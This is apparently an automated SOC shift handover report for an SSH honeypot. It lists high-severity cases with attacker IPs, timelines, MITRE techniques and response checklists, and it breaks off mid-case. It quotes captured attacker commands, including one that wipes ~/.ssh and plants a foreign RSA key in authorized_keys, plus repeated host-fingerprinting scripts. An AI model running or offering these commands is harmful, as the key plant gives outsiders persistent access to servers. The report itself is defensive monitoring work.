# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-14 |
| **Generated At** | 2026-03-14T16:28:54Z |
| **Shift Time** | 16:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **652** |
| Confirmed Threats | **269** |
| False Positives Filtered | **383** (58.7%) |
| Unique Attacker IPs | **165** |
| Countries of Origin | **30** |
| High Severity Cases | **58** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **594** |
| Malware Samples Analyzed | **0** HIGH · **1** MED · 0 empty upload attempt(s) |

---

## 🚨 Priority Cases — Immediate Attention (41)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c423d371a03d

| Field | Detail |
|---|---|
| **Source IP** | `223.197.145[.]33` |
| **First Seen** | 2026-03-14 00:34 |
| **Last Seen** | 2026-03-14 00:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 00:34:47` | `cowrie.session.connect` |
| `2026-03-14 00:34:48` | `cowrie.client.version` |
| `2026-03-14 00:34:48` | `cowrie.client.kex` |
| `2026-03-14 00:34:50` | `cowrie.login.success` |
| `2026-03-14 00:34:51` | `cowrie.direct-tcpip.request` |
| `2026-03-14 00:34:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.145[.]33` to AbuseIPDB if not already reported
- [ ] Block `223.197.145[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ffb86d5fbda

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-14 06:15 |
| **Last Seen** | 2026-03-14 06:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 06:15:05` | `cowrie.session.connect` |
| `2026-03-14 06:15:05` | `cowrie.client.version` |
| `2026-03-14 06:15:05` | `cowrie.client.kex` |
| `2026-03-14 06:15:06` | `cowrie.login.success` |
| `2026-03-14 06:15:07` | `cowrie.session.params` |
| `2026-03-14 06:15:07` | `cowrie.command.input` |
| `2026-03-14 06:15:07` | `cowrie.command.failed` |
| `2026-03-14 06:15:07` | `cowrie.log.closed` |
| `2026-03-14 06:15:08` | `cowrie.session.params` |
| `2026-03-14 06:15:08` | `cowrie.command.input` |
| `2026-03-14 06:15:08` | `cowrie.session.file_download` |
| `2026-03-14 06:15:08` | `cowrie.log.closed` |
| `2026-03-14 06:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373471b4b6ee

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-14 06:15 |
| **Last Seen** | 2026-03-14 06:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 06:15:12` | `cowrie.session.connect` |
| `2026-03-14 06:15:12` | `cowrie.client.version` |
| `2026-03-14 06:15:12` | `cowrie.client.kex` |
| `2026-03-14 06:15:13` | `cowrie.login.success` |
| `2026-03-14 06:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97931e58bc67

| Field | Detail |
|---|---|
| **Source IP** | `120.223.246[.]138` |
| **First Seen** | 2026-03-14 06:40 |
| **Last Seen** | 2026-03-14 06:42 |
| **Session Duration** | 153s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 06:40:15` | `cowrie.session.connect` |
| `2026-03-14 06:40:16` | `cowrie.client.version` |
| `2026-03-14 06:40:16` | `cowrie.client.kex` |
| `2026-03-14 06:40:17` | `cowrie.login.success` |
| `2026-03-14 06:42:48` | `cowrie.session.file_upload` |
| `2026-03-14 06:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.223.246[.]138` to AbuseIPDB if not already reported
- [ ] Block `120.223.246[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b019e5f4633e

| Field | Detail |
|---|---|
| **Source IP** | `183.220.227[.]73` |
| **First Seen** | 2026-03-14 06:49 |
| **Last Seen** | 2026-03-14 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 06:49:21` | `cowrie.session.connect` |
| `2026-03-14 06:49:21` | `cowrie.client.version` |
| `2026-03-14 06:49:22` | `cowrie.client.kex` |
| `2026-03-14 06:49:22` | `cowrie.login.success` |
| `2026-03-14 06:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.220.227[.]73` to AbuseIPDB if not already reported
- [ ] Block `183.220.227[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d1602f5d0df

| Field | Detail |
|---|---|
| **Source IP** | `213.124.221[.]2` |
| **First Seen** | 2026-03-14 07:23 |
| **Last Seen** | 2026-03-14 07:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:23:23` | `cowrie.session.connect` |
| `2026-03-14 07:23:24` | `cowrie.client.version` |
| `2026-03-14 07:23:24` | `cowrie.client.kex` |
| `2026-03-14 07:23:24` | `cowrie.login.success` |
| `2026-03-14 07:23:25` | `cowrie.direct-tcpip.request` |
| `2026-03-14 07:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.124.221[.]2` to AbuseIPDB if not already reported
- [ ] Block `213.124.221[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f02b106208ae

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:34 |
| **Last Seen** | 2026-03-14 07:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:34:32` | `cowrie.session.connect` |
| `2026-03-14 07:34:32` | `cowrie.client.version` |
| `2026-03-14 07:34:32` | `cowrie.client.kex` |
| `2026-03-14 07:34:34` | `cowrie.login.success` |
| `2026-03-14 07:34:34` | `cowrie.session.params` |
| `2026-03-14 07:34:34` | `cowrie.command.input` |
| `2026-03-14 07:34:34` | `cowrie.command.input` |
| `2026-03-14 07:34:34` | `cowrie.command.input` |
| `2026-03-14 07:34:34` | `cowrie.command.input` |
| `2026-03-14 07:34:35` | `cowrie.log.closed` |
| `2026-03-14 07:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8ed162c0bc1

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:35 |
| **Last Seen** | 2026-03-14 07:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:35:16` | `cowrie.session.connect` |
| `2026-03-14 07:35:16` | `cowrie.client.version` |
| `2026-03-14 07:35:16` | `cowrie.client.kex` |
| `2026-03-14 07:35:17` | `cowrie.login.success` |
| `2026-03-14 07:35:18` | `cowrie.session.params` |
| `2026-03-14 07:35:18` | `cowrie.command.input` |
| `2026-03-14 07:35:18` | `cowrie.command.input` |
| `2026-03-14 07:35:18` | `cowrie.command.input` |
| `2026-03-14 07:35:18` | `cowrie.command.input` |
| `2026-03-14 07:35:18` | `cowrie.log.closed` |
| `2026-03-14 07:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58cc71ea1bb5

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:35 |
| **Last Seen** | 2026-03-14 07:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:35:59` | `cowrie.session.connect` |
| `2026-03-14 07:35:59` | `cowrie.client.version` |
| `2026-03-14 07:35:59` | `cowrie.client.kex` |
| `2026-03-14 07:36:03` | `cowrie.login.success` |
| `2026-03-14 07:36:03` | `cowrie.session.params` |
| `2026-03-14 07:36:03` | `cowrie.command.input` |
| `2026-03-14 07:36:03` | `cowrie.command.input` |
| `2026-03-14 07:36:03` | `cowrie.command.input` |
| `2026-03-14 07:36:03` | `cowrie.command.input` |
| `2026-03-14 07:36:03` | `cowrie.log.closed` |
| `2026-03-14 07:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1a9233804b

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:36 |
| **Last Seen** | 2026-03-14 07:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:36:47` | `cowrie.session.connect` |
| `2026-03-14 07:36:48` | `cowrie.client.version` |
| `2026-03-14 07:36:48` | `cowrie.client.kex` |
| `2026-03-14 07:36:49` | `cowrie.login.success` |
| `2026-03-14 07:36:50` | `cowrie.session.params` |
| `2026-03-14 07:36:50` | `cowrie.command.input` |
| `2026-03-14 07:36:50` | `cowrie.command.input` |
| `2026-03-14 07:36:50` | `cowrie.command.input` |
| `2026-03-14 07:36:50` | `cowrie.command.input` |
| `2026-03-14 07:36:50` | `cowrie.log.closed` |
| `2026-03-14 07:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0871cd1968b

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:37 |
| **Last Seen** | 2026-03-14 07:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:37:31` | `cowrie.session.connect` |
| `2026-03-14 07:37:32` | `cowrie.client.version` |
| `2026-03-14 07:37:32` | `cowrie.client.kex` |
| `2026-03-14 07:37:33` | `cowrie.login.success` |
| `2026-03-14 07:37:34` | `cowrie.session.params` |
| `2026-03-14 07:37:34` | `cowrie.command.input` |
| `2026-03-14 07:37:34` | `cowrie.command.input` |
| `2026-03-14 07:37:34` | `cowrie.command.input` |
| `2026-03-14 07:37:34` | `cowrie.command.input` |
| `2026-03-14 07:37:34` | `cowrie.log.closed` |
| `2026-03-14 07:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e00da4f111

| Field | Detail |
|---|---|
| **Source IP** | `134.199.151[.]94` |
| **First Seen** | 2026-03-14 07:38 |
| **Last Seen** | 2026-03-14 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 07:38:17` | `cowrie.session.connect` |
| `2026-03-14 07:38:17` | `cowrie.client.version` |
| `2026-03-14 07:38:18` | `cowrie.client.kex` |
| `2026-03-14 07:38:18` | `cowrie.login.success` |
| `2026-03-14 07:38:19` | `cowrie.session.params` |
| `2026-03-14 07:38:19` | `cowrie.command.input` |
| `2026-03-14 07:38:19` | `cowrie.command.input` |
| `2026-03-14 07:38:19` | `cowrie.command.input` |
| `2026-03-14 07:38:19` | `cowrie.command.input` |
| `2026-03-14 07:38:19` | `cowrie.log.closed` |
| `2026-03-14 07:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `134.199.151[.]94` to AbuseIPDB if not already reported
- [ ] Block `134.199.151[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-589e924f95fb

| Field | Detail |
|---|---|
| **Source IP** | `68.183.86[.]77` |
| **First Seen** | 2026-03-14 08:48 |
| **Last Seen** | 2026-03-14 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 08:48:10` | `cowrie.session.connect` |
| `2026-03-14 08:48:11` | `cowrie.client.version` |
| `2026-03-14 08:48:11` | `cowrie.client.kex` |
| `2026-03-14 08:48:11` | `cowrie.login.success` |
| `2026-03-14 08:48:12` | `cowrie.session.params` |
| `2026-03-14 08:48:12` | `cowrie.command.input` |
| `2026-03-14 08:48:12` | `cowrie.command.input` |
| `2026-03-14 08:48:12` | `cowrie.command.input` |
| `2026-03-14 08:48:12` | `cowrie.command.input` |
| `2026-03-14 08:48:12` | `cowrie.log.closed` |
| `2026-03-14 08:48:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.86[.]77` to AbuseIPDB if not already reported
- [ ] Block `68.183.86[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e2167457ba4

| Field | Detail |
|---|---|
| **Source IP** | `68.183.86[.]77` |
| **First Seen** | 2026-03-14 08:49 |
| **Last Seen** | 2026-03-14 08:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 08:49:05` | `cowrie.session.connect` |
| `2026-03-14 08:49:05` | `cowrie.client.version` |
| `2026-03-14 08:49:05` | `cowrie.client.kex` |
| `2026-03-14 08:49:05` | `cowrie.login.success` |
| `2026-03-14 08:49:06` | `cowrie.session.params` |
| `2026-03-14 08:49:06` | `cowrie.command.input` |
| `2026-03-14 08:49:06` | `cowrie.command.input` |
| `2026-03-14 08:49:06` | `cowrie.command.input` |
| `2026-03-14 08:49:06` | `cowrie.command.input` |
| `2026-03-14 08:49:06` | `cowrie.log.closed` |
| `2026-03-14 08:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.86[.]77` to AbuseIPDB if not already reported
- [ ] Block `68.183.86[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33036dbcaa28

| Field | Detail |
|---|---|
| **Source IP** | `68.183.86[.]77` |
| **First Seen** | 2026-03-14 08:49 |
| **Last Seen** | 2026-03-14 08:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 08:49:47` | `cowrie.session.connect` |
| `2026-03-14 08:49:47` | `cowrie.client.version` |
| `2026-03-14 08:49:47` | `cowrie.client.kex` |
| `2026-03-14 08:49:47` | `cowrie.login.success` |
| `2026-03-14 08:49:47` | `cowrie.session.params` |
| `2026-03-14 08:49:47` | `cowrie.command.input` |
| `2026-03-14 08:49:47` | `cowrie.command.input` |
| `2026-03-14 08:49:47` | `cowrie.command.input` |
| `2026-03-14 08:49:47` | `cowrie.command.input` |
| `2026-03-14 08:49:47` | `cowrie.log.closed` |
| `2026-03-14 08:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.86[.]77` to AbuseIPDB if not already reported
- [ ] Block `68.183.86[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-497f4cf7f75b

| Field | Detail |
|---|---|
| **Source IP** | `68.183.86[.]77` |
| **First Seen** | 2026-03-14 08:50 |
| **Last Seen** | 2026-03-14 08:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-14 08:50:28` | `cowrie.session.connect` |
| `2026-03-14 08:50:28` | `cowrie.client.version` |
| `2026-03-14 08:50:28` | `cowrie.client.kex` |
| `2026-03-14 08:50:28` | `cowrie.login.success` |
| `2026-03-14 08:50:28` | `cowrie.session.params` |
| `2026-03-14 08:50:28` | `cowrie.command.input` |
| `2026-03-14 08:50:28` | `cowrie.command.input` |
| `2026-03-14 08:50:28` | `cowrie.command.input` |
| `2026-03-14 08:50:28` | `cowrie.command.input` |
| `2026-03-14 08:50:28` | `cowrie.log.closed` |
| `2026-03-14 08:50:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.86[.]77` to AbuseIPDB if not already reported
- [ ] Block `68.183.86[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bdcfd759099

| Field | Detail |
|---|---|
| **Source IP** | `68.183.86[.]77` |
| **First Seen** | 2026-03-14 08:51 |
| **Last Seen** | 2026-03-14 08:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
